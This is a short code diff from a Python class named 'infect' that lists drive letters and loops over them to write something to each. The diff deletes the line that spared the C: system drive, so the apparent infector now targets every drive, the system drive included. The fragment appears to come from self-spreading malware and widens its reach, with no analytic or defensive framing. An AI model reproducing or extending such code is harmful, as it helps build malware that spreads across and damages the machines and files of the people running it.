@@ -43,7 +43,6 @@ class infect:
             drivename = chr(drive) + ':\\'
             if os.path.exists(drivename):
                 drives.append(drivename)
-        drives.remove("C:\\")
         try:
             for infectwrite in drives:
                 try:
